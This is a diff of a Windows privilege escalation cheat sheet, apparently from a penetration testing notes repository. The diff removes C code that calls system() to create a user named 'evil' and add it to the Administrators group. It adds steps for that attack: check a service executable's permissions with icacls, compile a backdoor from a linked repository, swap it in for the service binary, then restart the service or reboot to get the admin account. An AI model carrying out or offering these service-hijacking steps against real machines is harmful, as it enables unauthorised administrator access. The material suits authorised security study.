@@ -139,18 +139,21 @@ Windows Privilege Escalation Methodology
   
 -> Focus on Program Files or compare with a Defaults of your system.
 
-* icacls "<path>\<file>.exe"
-'''
-#include <stdlib.h>
-int main ()
-{
- int i;
+* icacls "\<path>\<file>.exe"
+  * if Permisions allow to have Full access or Write go to compile: https://github.com/nickvourd/windows_backdoor.git
 
- i = system ("net user evil Ev!lpass /add");
- i = system ("net localgroup administrators evil /add");
-return 0;
-}
-'''
+* upload the new backdoor and rename the old exe with new exe
+
+* net stop <service>
+  *if access denied, use >wmic service where caption="<servicename>" get name, caption, state, startmode
+    * if Auto attribute exists
+ 
+* whoami /priv
+  * if SeShutdownPrivilege then:
+    *  shutdown /r /t 0 
+    
+When you will open you will have evil to administrators groups:
+ *  net localgroup Administrators
 
 ## Token Manipulation
 * whoami /priv
